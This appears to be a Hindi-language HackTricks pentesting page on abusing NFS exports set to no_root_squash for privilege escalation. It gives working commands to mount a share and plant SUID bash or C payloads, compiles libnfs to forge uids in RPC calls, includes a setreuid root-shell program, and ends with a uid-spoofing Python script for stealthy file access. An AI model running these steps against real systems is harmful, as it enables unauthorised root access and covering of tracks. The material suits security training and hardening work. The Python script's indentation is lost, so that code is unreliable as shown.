{{#include ../../banners/hacktricks-training.md}}

# Squashing Basic Info

NFS आमतौर पर (विशेष रूप से लिनक्स में) क्लाइंट द्वारा फ़ाइलों तक पहुँचने के लिए निर्दिष्ट `uid` और `gid` पर भरोसा करेगा (यदि kerberos का उपयोग नहीं किया गया है)। हालाँकि, कुछ कॉन्फ़िगरेशन हैं जो सर्वर में सेट किए जा सकते हैं ताकि **इस व्यवहार को बदल सकें**:

- **`all_squash`**: यह सभी पहुँच को **`nobody`** (65534 unsigned / -2 signed) पर मैप करके दबा देता है। इसलिए, हर कोई `nobody` है और कोई उपयोगकर्ता उपयोग नहीं किया जाता है।
- **`root_squash`/`no_all_squash`**: यह लिनक्स पर डिफ़ॉल्ट है और **केवल uid 0 (root) के साथ पहुँच को दबाता है**। इसलिए, कोई भी `UID` और `GID` पर भरोसा किया जाता है लेकिन `0` को `nobody` में दबा दिया जाता है (इसलिए कोई रूट अनुकरण संभव नहीं है)।
- **``no_root_squash`**: यदि यह कॉन्फ़िगरेशन सक्षम है तो यह रूट उपयोगकर्ता को भी नहीं दबाता है। इसका मतलब है कि यदि आप इस कॉन्फ़िगरेशन के साथ एक निर्देशिका को माउंट करते हैं, तो आप इसे रूट के रूप में एक्सेस कर सकते हैं।

**/etc/exports** फ़ाइल में, यदि आप किसी निर्देशिका को **no_root_squash** के रूप में कॉन्फ़िगर किया हुआ पाते हैं, तो आप **एक क्लाइंट के रूप में** इसे **एक्सेस** कर सकते हैं और उस निर्देशिका के अंदर **लिख सकते हैं** जैसे कि आप मशीन के स्थानीय **रूट** थे।

**NFS** के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

Option 1 using bash:
- **क्लाइंट मशीन में उस निर्देशिका को माउंट करना**, और **रूट के रूप में** माउंट की गई फ़ोल्डर के अंदर **/bin/bash** बाइनरी को कॉपी करना और इसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस बाश बाइनरी को निष्पादित करना।
- ध्यान दें कि NFS शेयर के अंदर रूट होने के लिए, **`no_root_squash`** को सर्वर में कॉन्फ़िगर किया जाना चाहिए।
- हालाँकि, यदि सक्षम नहीं किया गया है, तो आप बाइनरी को NFS शेयर में कॉपी करके और इसे उस उपयोगकर्ता के रूप में SUID अनुमति देकर अन्य उपयोगकर्ता में वृद्धि कर सकते हैं, जिसे आप बढ़ाना चाहते हैं।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
विकल्प 2 c संकलित कोड का उपयोग करते हुए:
- **क्लाइंट मशीन में उस निर्देशिका को माउंट करना**, और **रूट के रूप में** माउंट की गई फ़ोल्डर के अंदर हमारे संकलित पेलोड को कॉपी करना जो SUID अनुमति का दुरुपयोग करेगा, इसे **SUID** अधिकार देगा, और **शिकार** मशीन से उस बाइनरी को **निष्पादित** करेगा (आप यहाँ कुछ[ C SUID पेलोड्स](payloads-to-execute.md#c) पा सकते हैं)।
- पहले की तरह ही प्रतिबंध।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> ध्यान दें कि यदि आप अपने मशीन से पीड़ित मशीन तक **एक टनल बना सकते हैं, तो आप इस विशेषाधिकार वृद्धि का शोषण करने के लिए रिमोट संस्करण का उपयोग कर सकते हैं, आवश्यक पोर्ट्स को टनल करते हुए**।\
> निम्नलिखित ट्रिक उस स्थिति के लिए है जब फ़ाइल `/etc/exports` **एक IP को इंगित करती है**। इस मामले में आप **किसी भी स्थिति में** **रिमोट शोषण** का उपयोग नहीं कर पाएंगे और आपको **इस ट्रिक का दुरुपयोग करना होगा**।\
> शोषण के काम करने के लिए एक और आवश्यक आवश्यकता है कि **`/etc/export` के अंदर का निर्यात** **`insecure` फ्लैग का उपयोग कर रहा हो**।\
> --_मुझे यकीन नहीं है कि यदि `/etc/export` एक IP पते को इंगित कर रहा है तो यह ट्रिक काम करेगी_--

## Basic Information

परिदृश्य में एक स्थानीय मशीन पर एक माउंटेड NFS शेयर का शोषण करना शामिल है, NFSv3 विनिर्देशन में एक दोष का लाभ उठाते हुए जो क्लाइंट को अपने uid/gid को निर्दिष्ट करने की अनुमति देता है, संभावित रूप से अनधिकृत पहुंच सक्षम करता है। शोषण में [libnfs](https://github.com/sahlberg/libnfs) का उपयोग शामिल है, जो NFS RPC कॉल के forging की अनुमति देने वाली एक लाइब्रेरी है।

### Compiling the Library

लाइब्रेरी संकलन चरणों में कर्नेल संस्करण के आधार पर समायोजन की आवश्यकता हो सकती है। इस विशेष मामले में, fallocate syscalls को टिप्पणी की गई थी। संकलन प्रक्रिया में निम्नलिखित कमांड शामिल हैं:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### एक्सप्लॉइट करना

एक्सप्लॉइट में एक सरल C प्रोग्राम (`pwn.c`) बनाना शामिल है जो रूट के लिए विशेषाधिकार बढ़ाता है और फिर एक शेल निष्पादित करता है। प्रोग्राम को संकलित किया जाता है, और परिणामी बाइनरी (`a.out`) को suid रूट के साथ शेयर पर रखा जाता है, RPC कॉल में uid को फेक करने के लिए `ld_nfs.so` का उपयोग करते हुए:

1. **एक्सप्लॉइट कोड को संकलित करें:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **शेयर पर एक्सप्लॉइट रखें और uid को फेक करके इसकी अनुमतियों को संशोधित करें:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **शोषण को निष्पादित करें ताकि रूट विशेषाधिकार प्राप्त कर सकें:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell for Stealthy File Access

एक बार जब रूट एक्सेस प्राप्त हो जाता है, NFS शेयर के साथ इंटरैक्ट करने के लिए बिना स्वामित्व बदले (निशान छोड़ने से बचने के लिए), एक Python स्क्रिप्ट (nfsh.py) का उपयोग किया जाता है। यह स्क्रिप्ट uid को उस फ़ाइल के uid से मेल खाने के लिए समायोजित करती है जिसे एक्सेस किया जा रहा है, जिससे शेयर पर फ़ाइलों के साथ इंटरैक्शन की अनुमति मिलती है बिना अनुमति समस्याओं के:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Run like:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
